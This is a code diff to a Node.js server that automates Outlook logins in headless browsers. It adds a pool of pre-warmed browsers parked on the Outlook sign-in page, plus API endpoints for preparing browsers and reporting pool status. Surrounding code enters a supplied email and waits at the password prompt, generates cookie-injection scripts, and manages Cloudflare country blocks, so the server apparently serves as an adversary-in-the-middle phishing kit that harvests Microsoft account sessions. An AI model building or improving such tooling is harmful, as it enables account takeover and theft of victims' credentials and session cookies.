@@ -234,6 +234,11 @@ const automationSessions = new Map(); // sessionId -> { automation, status, emai
 const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
 const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state
 const MAX_PRELOADS = 2; // Maximum number of concurrent preloaded browsers
+const MAX_WARM_BROWSERS = 1; // Maximum number of pre-warmed browsers ready for immediate use
+const MIN_WARM_BROWSERS = 1; // Minimum number of warm browsers to maintain
+
+// Store for warm browsers that are pre-initialized and ready for immediate use
+const warmBrowserPool = new Map(); // warmId -> { automation, status, createdAt }
 
 // Store for SSE connections to send immediate authentication status updates
 const sseConnections = new Map(); // sessionId -> response object
@@ -302,6 +307,108 @@ function saveAnalytics() {
 // Initialize analytics from file
 const analytics = loadAnalytics();
 
+// Warm Browser Pool Management Functions
+async function createWarmBrowser() {
+    try {
+        const warmId = 'warm_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+        console.log(`🔥 Creating warm browser: ${warmId}`);
+        
+        const automation = new OutlookLoginAutomation({
+            enableScreenshots: false, // Disable screenshots for warm browsers to save resources
+            screenshotQuality: 80,
+            sessionId: warmId,
+            eventCallback: null // No event callbacks for warm browsers
+        });
+        
+        // Initialize browser and navigate to Outlook
+        await automation.init();
+        console.log(`🔧 Warm browser initialized: ${warmId}`);
+        
+        const navigated = await automation.navigateToOutlook();
+        if (!navigated) {
+            throw new Error('Failed to navigate to Outlook during warm browser creation');
+        }
+        console.log(`🌐 Warm browser navigated to Outlook: ${warmId}`);
+        
+        // Store in warm browser pool
+        warmBrowserPool.set(warmId, {
+            automation: automation,
+            status: 'warm_ready',
+            createdAt: Date.now()
+        });
+        
+        console.log(`✅ Warm browser ready: ${warmId}`);
+        return warmId;
+        
+    } catch (error) {
+        console.error(`❌ Failed to create warm browser:`, error.message);
+        return null;
+    }
+}
+
+async function maintainWarmBrowserPool() {
+    try {
+        const currentWarmCount = warmBrowserPool.size;
+        const neededBrowsers = MIN_WARM_BROWSERS - currentWarmCount;
+        
+        if (neededBrowsers > 0) {
+            console.log(`🔥 Need ${neededBrowsers} more warm browsers (current: ${currentWarmCount}, min: ${MIN_WARM_BROWSERS})`);
+            
+            // Create needed browsers in parallel but limit to MAX_WARM_BROWSERS
+            const browsersToCreate = Math.min(neededBrowsers, MAX_WARM_BROWSERS - currentWarmCount);
+            const creationPromises = [];
+            
+            for (let i = 0; i < browsersToCreate; i++) {
+                creationPromises.push(createWarmBrowser());
+            }
+            
+            if (creationPromises.length > 0) {
+                await Promise.all(creationPromises);
+            }
+        }
+    } catch (error) {
+        console.error('Error maintaining warm browser pool:', error.message);
+    }
+}
+
+function getWarmBrowser() {
+    // Get the oldest warm browser
+    for (const [warmId, warmData] of warmBrowserPool) {
+        if (warmData.status === 'warm_ready') {
+            warmBrowserPool.delete(warmId);
+            console.log(`🚀 Retrieved warm browser for use: ${warmId}`);
+            
+            // Trigger background maintenance to replace the used browser
+            setTimeout(() => {
+                maintainWarmBrowserPool().catch(error => {
+                    console.error('Background warm browser maintenance failed:', error.message);
+                });
+            }, 100);
+            
+            return warmData.automation;
+        }
+    }
+    return null;
+}
+
+// Start warm browser pool immediately when server starts
+async function initializeWarmBrowserPool() {
+    console.log('🔥 Initializing warm browser pool...');
+    try {
+        await maintainWarmBrowserPool();
+        console.log('✅ Warm browser pool initialized');
+    } catch (error) {
+        console.error('❌ Failed to initialize warm browser pool:', error.message);
+    }
+}
+
+// Initialize warm browser pool (non-blocking)
+setTimeout(() => {
+    initializeWarmBrowserPool().catch(error => {
+        console.error('Warm browser pool initialization failed:', error.message);
+    });
+}, 2000); // Start after 2 seconds to let server finish starting
+
 // Cleanup expired sessions and OAuth states
 setInterval(async () => {
     const now = Date.now();
@@ -335,6 +442,29 @@ setInterval(async () => {
             automationSessions.delete(sessionId);
             console.log(`🧹 Cleaned up expired automation session: ${sessionId}`);
         }
+    }
+    
+    // Clean up expired warm browsers (older than 20 minutes)
+    const WARM_BROWSER_TIMEOUT = 20 * 60 * 1000; // 20 minutes
+    for (const [warmId, warmData] of warmBrowserPool) {
+        if (now - warmData.createdAt > WARM_BROWSER_TIMEOUT) {
+            try {
+                if (warmData.automation) {
+                    await warmData.automation.close();
+                }
+            } catch (error) {
+                console.error(`Error closing warm browser ${warmId}:`, error.message);
+            }
+            warmBrowserPool.delete(warmId);
+            console.log(`🧹 Cleaned up expired warm browser: ${warmId}`);
+        }
+    }
+    
+    // Trigger warm browser pool maintenance after cleanup
+    if (warmBrowserPool.size < MIN_WARM_BROWSERS) {
+        maintainWarmBrowserPool().catch(error => {
+            console.error('Warm browser pool maintenance failed during cleanup:', error.message);
+        });
     }
 }, 2 * 60 * 1000); // Check every 2 minutes
 
@@ -393,10 +523,10 @@ function generateCookieInjectionScript(email, cookies, sessionId) {
 `;
 }
 
-// Browser preloading functions for performance optimization
+// Enhanced browser preloading functions for performance optimization
 async function startBrowserPreload(sessionId, email) {
     try {
-        console.log(`🚀 Starting browser preload for session: ${sessionId}, email: ${email}`);
+        console.log(`🚀 Starting enhanced browser preload for session: ${sessionId}, email: ${email}`);
 
         // Check if we've reached the maximum preload limit
         const currentPreloads = Array.from(automationSessions.values())
@@ -426,13 +556,35 @@ async function startBrowserPreload(sessionId, email) {
             }
         }
 
-        // Create new automation instance
-        const automation = new OutlookLoginAutomation({
-            enableScreenshots: true,
-            screenshotQuality: 80,
-            sessionId: sessionId,
-            eventCallback: broadcastAuthEvent
-        });
+        let automation = null;
+        let usedWarmBrowser = false;
+
+        // Try to get a warm browser from the pool first (OPTIMIZATION!)
+        const warmBrowser = getWarmBrowser();
+        if (warmBrowser) {
+            automation = warmBrowser;
+            usedWarmBrowser = true;
+            console.log(`⚡ Using warm browser for fast preload: ${sessionId}, email: ${email}`);
+        } else {
+            // Fallback to cold start - create new automation instance
+            console.log(`🔧 No warm browser available, using cold start for: ${sessionId}, email: ${email}`);
+            automation = new OutlookLoginAutomation({
+                enableScreenshots: true,
+                screenshotQuality: 80,
+                sessionId: sessionId,
+                eventCallback: broadcastAuthEvent
+            });
+
+            // Initialize browser and navigate (cold start)
+            await automation.init();
+            console.log(`🔧 Browser initialized for preload session: ${sessionId}`);
+
+            const navigated = await automation.navigateToOutlook();
+            if (!navigated) {
+                throw new Error('Failed to navigate to Outlook during preload');
+            }
+            console.log(`🌐 Navigated to Outlook for preload session: ${sessionId}`);
+        }
 
         // Store in automationSessions with preloading status
         automationSessions.set(sessionId, {
@@ -440,18 +592,9 @@ async function startBrowserPreload(sessionId, email) {
             status: 'preloading',
             email: email,
             startTime: Date.now(),
-            sessionId: sessionId
+            sessionId: sessionId,
+            usedWarmBrowser: usedWarmBrowser
         });
-
-        // Initialize browser and start preload process
-        await automation.init();
-        console.log(`🔧 Browser initialized for preload session: ${sessionId}`);
-
-        const navigated = await automation.navigateToOutlook();
-        if (!navigated) {
-            throw new Error('Failed to navigate to Outlook during preload');
-        }
-        console.log(`🌐 Navigated to Outlook for preload session: ${sessionId}`);
 
         // Start the preload process (email entry and wait at password prompt)
         const preloadSuccess = await automation.preload(email);
@@ -2729,7 +2872,102 @@ app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, asyn
     }
 });
 
+// Instant Browser Preparation API endpoint
+app.post('/api/prepare-browser', async (req, res) => {
+    try {
+        console.log('🚀 Instant browser preparation requested');
+        
+        // Get current warm browser pool status
+        const currentWarmCount = warmBrowserPool.size;
+        const warmBrowsersReady = Array.from(warmBrowserPool.values())
+            .filter(warm => warm.status === 'warm_ready').length;
+        
+        // Check if we already have warm browsers ready
+        if (warmBrowsersReady > 0) {
+            return res.json({
+                success: true,
+                message: 'Warm browsers already available',
+                warmBrowsersReady: warmBrowsersReady,
+                totalWarmBrowsers: currentWarmCount,
+                preparationTime: 0
+            });
+        }
+        
+        // Start immediate warm browser creation if needed
+        const startTime = Date.now();
+        let newBrowsersCreated = 0;
+        
+        try {
+            // Trigger immediate warm browser creation
+            await maintainWarmBrowserPool();
+            
+            // Count newly created browsers
+            const newWarmCount = Array.from(warmBrowserPool.values())
+                .filter(warm => warm.status === 'warm_ready').length;
+            newBrowsersCreated = newWarmCount - warmBrowsersReady;
+            
+            const preparationTime = Date.now() - startTime;
+            
+            res.json({
+                success: true,
+                message: 'Browser preparation completed',
+                warmBrowsersReady: newWarmCount,
+                totalWarmBrowsers: warmBrowserPool.size,
+                newBrowsersCreated: newBrowsersCreated,
+                preparationTime: preparationTime
+            });
+            
+        } catch (error) {
+            console.error('Error during instant browser preparation:', error.message);
+            res.status(500).json({
+                success: false,
+                error: 'Browser preparation failed',
+                details: error.message,
+                warmBrowsersReady: warmBrowsersReady,
+                totalWarmBrowsers: currentWarmCount
+            });
+        }
+        
+    } catch (error) {
+        console.error('Error in prepare-browser endpoint:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to prepare browser',
+            details: error.message
+        });
+    }
+});
 
+// Warm Browser Pool Status API endpoint
+app.get('/api/browser-pool-status', (req, res) => {
+    try {
+        const warmBrowsers = Array.from(warmBrowserPool.values());
+        const readyBrowsers = warmBrowsers.filter(warm => warm.status === 'warm_ready');
+        
+        res.json({
+            success: true,
+            status: {
+                totalWarmBrowsers: warmBrowserPool.size,
+                readyBrowsers: readyBrowsers.length,
+                maxWarmBrowsers: MAX_WARM_BROWSERS,
+                minWarmBrowsers: MIN_WARM_BROWSERS
+            },
+            browsers: warmBrowsers.map(warm => ({
+                status: warm.status,
+                age: Date.now() - warm.createdAt,
+                createdAt: warm.createdAt
+            }))
+        });
+        
+    } catch (error) {
+        console.error('Error getting browser pool status:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to get browser pool status',
+            details: error.message
+        });
+    }
+});
 
 // Start server
 app.listen(PORT, '0.0.0.0', () => {
